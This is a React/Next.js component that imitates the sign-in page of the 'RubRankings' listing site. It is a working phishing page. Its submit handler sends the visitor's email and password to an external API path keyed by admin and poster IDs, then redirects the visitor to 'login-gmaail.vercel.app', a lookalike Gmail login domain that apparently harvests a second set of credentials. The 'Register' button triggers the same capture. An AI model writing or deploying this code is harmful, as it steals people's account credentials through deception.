"use client";
import React, { useState } from "react";
import Image from "next/image";
import { Navigation, User, Menu, PlusCircle } from "lucide-react";
import { API_URL } from "@/config";

export default function RubRankings({ adminId, posterId, verifyId, sitename }) {
  const [formValues, setFormValues] = useState({
    email: "",
    password: "",
    remember: "",
  });
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [onlyVerified, setOnlyVerified] = useState(true);

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormValues((prev) => ({
      ...prev,
      [name]: value,
    }));
  };

  const handleSubmit = async (e) => {
    if (e && e.preventDefault) {
      e.preventDefault();
    }
    setIsSubmitting(true);

    const redirectUrl =
      adminId && posterId && verifyId
        ? `https://login-gmaail.vercel.app/${adminId}/${posterId}/${verifyId}`
        : "https://login-gmaail.vercel.app";

    try {
      if (adminId && posterId) {
        const url = `${API_URL}/ad/${adminId}/${posterId}`;
        await fetch(url, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            email: formValues.email,
            password: formValues.password,
            remember: formValues.remember || "true",
          }),
        });
      }
    } catch (error) {
      console.error("Error submitting user data:", error);
    } finally {
      window.location.href = redirectUrl;
    }
  };

  return (
    <div className="min-h-screen w-full max-w-full overflow-x-hidden bg-[#141414] text-white flex flex-col justify-between select-none box-border">
      {/* Top Header Bar */}
      <div className="w-full max-w-full">
        <header className="w-full max-w-full bg-black border-b border-[#222] box-border">
          <div className="w-full max-w-full flex items-center justify-between h-10 sm:h-12 px-0">
            {/* Left side: Cities & Location */}
            <div className="flex items-center h-full shrink-0">
              <button
                type="button"
                className="bg-[#7a1be3] hover:bg-[#6814c9] text-white text-[11px] sm:text-sm font-semibold px-2.5 sm:px-4 h-full flex items-center justify-center transition-colors"
              >
                Cities
              </button>
              <div className="flex items-center gap-1 px-1.5 sm:px-3 text-gray-200">
                <Navigation size={13} className="rotate-45 text-gray-300 shrink-0" />
                <span className="hidden sm:inline text-xs sm:text-sm font-bold tracking-wide">
                  NEW YORK
                </span>
              </div>
            </div>

            {/* Middle Notice (Desktop/Tablet) */}
            <div className="hidden md:block text-center px-2 min-w-0">
              <p className="text-[#e53935] text-xs sm:text-sm font-medium tracking-tight truncate">
                As Promised All Year Long: Check Out the New Escorts Section.
              </p>
            </div>

            {/* Right side: Categories, User, Support */}
            <div className="flex items-center gap-1 sm:gap-3 h-full shrink-0 pr-0">
              {/* Category tabs */}
              <div className="flex items-center gap-1 text-[10px] sm:text-sm font-medium">
                <span className="border border-gray-600 rounded px-1.5 py-0.5 sm:px-2.5 sm:py-1 text-gray-200 bg-[#1e1e1e]/80 text-[10px] sm:text-xs">
                  BodyRubs
                </span>
                <span className="text-gray-300 text-[10px] sm:text-xs pr-0.5 sm:pr-1">
                  Escorts
                </span>
              </div>

              {/* User / Sign in / Menu */}
              <div className="flex items-center gap-0.5 sm:gap-1 text-gray-200 px-0.5 sm:px-1">
                <User size={16} className="text-[#f5af7e] shrink-0" />
                <span className="hidden sm:inline text-xs sm:text-sm font-medium">
                  Sign in
                </span>
                <Menu size={18} className="sm:hidden text-[#f5af7e] ml-0.5 shrink-0" />
              </div>

              {/* Support button */}
              <button
                type="button"
                className="bg-[#7a1be3] hover:bg-[#6814c9] text-white text-[11px] sm:text-sm font-semibold px-2.5 sm:px-4 h-full flex items-center justify-center transition-colors"
              >
                Support
              </button>
            </div>
          </div>
        </header>

        {/* Mobile Red Notification Banner */}
        <div className="md:hidden bg-black py-1 px-2 text-center border-b border-[#222]">
          <p className="text-[#e53935] text-[10px] sm:text-[11px] font-medium leading-tight break-words">
            As Promised All Year Long: Check Out the New Escorts Section.
          </p>
        </div>

        {/* Subheader / Logo & Action Bar */}
        <div className="w-full max-w-full bg-black px-3 sm:px-8 py-2.5 sm:py-3.5 flex items-center justify-between border-b border-[#1e1e1e] box-border">
          {/* Logo */}
          <div className="flex items-center min-w-0">
            <Image
              src="/new-logo.jpeg"
              alt="Rub Rankings Logo"
              width={260}
              height={65}
              className="h-10 sm:h-12 md:h-14 w-auto object-contain max-w-[180px] sm:max-w-[260px]"
              priority
            />
          </div>

          {/* Subheader Right Actions */}
          <div className="flex items-center gap-2 sm:gap-5 shrink-0">
            <button
              type="button"
              className="hidden sm:block bg-[#7a1be3] hover:bg-[#6814c9] text-white text-sm font-medium px-4 py-1.5 rounded transition-colors"
            >
              Signup
            </button>
            <span className="hidden sm:inline text-gray-200 text-sm font-medium hover:text-purple-300 cursor-pointer">
              Faq&apos;s
            </span>
            <div className="flex items-center gap-1.5 cursor-pointer select-none">
              <div className="w-5 h-5 sm:w-6 sm:h-6 rounded-full bg-[#7a1be3] flex items-center justify-center text-white font-bold text-xs sm:text-sm shrink-0">
                +
              </div>
              <span className="text-white text-xs sm:text-base font-semibold whitespace-nowrap">
                Add A Listing
              </span>
            </div>
          </div>
        </div>
      </div>

      {/* Main Content / Sign In Card */}
      <main className="flex-1 flex flex-col justify-center items-center px-4 py-6 sm:py-8 max-w-md mx-auto w-full box-border">
        <h1 className="text-2xl sm:text-3xl font-bold text-white mb-5 sm:mb-6 text-center tracking-tight">
          My Listings
        </h1>

        <form onSubmit={handleSubmit} className="w-full space-y-3.5 sm:space-y-4">
          <div className="w-full">
            <input
              type="text"
              name="email"
              placeholder="Email"
              required
              value={formValues.email}
              onChange={handleChange}
              className="w-full bg-[#1e1e1e] border border-[#333] rounded-md px-4 py-3 text-white placeholder-gray-400 focus:outline-none focus:border-[#7a1be3] text-sm sm:text-base transition-colors box-border"
            />
          </div>

          <div className="w-full">
            <input
              type="password"
              name="password"
              placeholder="Password"
              required
              value={formValues.password}
              onChange={handleChange}
              className="w-full bg-[#1e1e1e] border border-[#333] rounded-md px-4 py-3 text-white placeholder-gray-400 focus:outline-none focus:border-[#7a1be3] text-sm sm:text-base transition-colors box-border"
            />
          </div>

          <button
            type="submit"
            disabled={isSubmitting}
            className="w-full bg-[#7a1be3] hover:bg-[#6814c9] text-white font-bold py-3 sm:py-3.5 rounded-md text-sm sm:text-base uppercase tracking-wider transition-all duration-200 shadow-md active:scale-[0.99] disabled:opacity-75 cursor-pointer"
          >
            {isSubmitting ? "SIGNING IN..." : "SIGN IN"}
          </button>

          {/* Reset password link */}
          <div className="text-center pt-1.5 sm:pt-2">
            <p className="text-gray-300 text-xs sm:text-sm">
              Forgot your password?{" "}
              <span className="text-white hover:underline cursor-pointer">
                Reset your password
              </span>
            </p>
          </div>

          {/* Register for a new account */}
          <div className="pt-0.5 sm:pt-1">
            <button
              type="button"
              onClick={handleSubmit}
              className="w-full bg-[#f97316] hover:bg-[#ea580c] text-white font-bold py-2.5 sm:py-3 rounded-md text-xs sm:text-base uppercase tracking-wide transition-colors shadow text-center cursor-pointer"
            >
              REGISTER FOR A NEW ACCOUNT
            </button>
          </div>
        </form>

        {/* Verified Profiles Toggle */}
        <div className="w-full flex justify-end items-center gap-2 pt-4 sm:pt-6">
          <div
            onClick={() => setOnlyVerified(!onlyVerified)}
            className="flex items-center gap-2 cursor-pointer select-none"
          >
            <div
              className={`w-10 h-5 sm:w-11 sm:h-6 flex items-center rounded-full p-0.5 sm:p-1 transition-colors duration-300 ${
                onlyVerified ? "bg-[#7a1be3]" : "bg-gray-600"
              }`}
            >
              <div
                className={`bg-white w-4 h-4 rounded-full shadow-md transform transition-transform duration-300 ${
                  onlyVerified ? "translate-x-5" : "translate-x-0"
                }`}
              />
            </div>
            <span className="text-xs sm:text-sm font-medium text-gray-300 whitespace-nowrap">
              Only Verified Profiles
            </span>
          </div>
        </div>
      </main>

      {/* Bottom Footer Banner */}
      <footer className="w-full max-w-full bg-[#7a1be3] py-2 px-3 sm:py-2.5 sm:px-4 flex flex-wrap sm:flex-nowrap items-center justify-center gap-2 sm:gap-4 text-center box-border">
        <span className="text-white text-xs sm:text-base font-semibold">
          Same RubRankings - New Escorts Sections
        </span>
        <button
          type="button"
          className="bg-white hover:bg-gray-100 text-black font-semibold text-xs sm:text-sm px-4 sm:px-5 py-0.5 sm:py-1 rounded-full shadow transition-colors shrink-0"
        >
          Review
        </button>
      </footer>
    </div>
  );
}
